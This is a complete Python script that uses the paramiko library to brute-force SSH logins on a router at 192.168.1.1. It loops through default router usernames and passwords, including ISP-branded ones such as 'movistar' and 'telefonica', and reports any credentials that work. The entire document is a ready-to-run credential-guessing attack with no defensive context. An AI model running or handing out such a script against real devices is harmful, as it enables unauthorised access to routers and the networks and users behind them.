import paramiko
import socket
import time

target = "192.168.1.1"
port = 22
timeout = 5

# Common usernames and passwords for routers
usernames = ["admin", "root", "user", "1234", "movistar", "telefonica"]
passwords = ["admin", "root", "password", "1234", "", "movistar", "telefonica"]

# Disable paramiko logging
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

# Function to attempt SSH login
def try_ssh_login(host, port, username, password, timeout=5):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            disabled_algorithms=dict(pubkeys=["rsa-sha2-512", "rsa-sha2-256"])
        )
        print(f"[+] Success! Username: {username}, Password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {username}/{password}")
        return False
    except (socket.timeout, paramiko.SSHException) as e:
        print(f"[!] Error: {str(e)}")
        return False
    finally:
        client.close()

# Try common credentials
print(f"[*] Starting SSH brute force against {target}:{port}")
success = False

for username in usernames:
    if success:
        break
    for password in passwords:
        print(f"[*] Trying: {username}/{password}")
        if try_ssh_login(target, port, username, password, timeout):
            success = True
            break
        # Sleep to avoid overwhelming the target
        time.sleep(1)

if not success:
    print("[!] All login attempts failed")
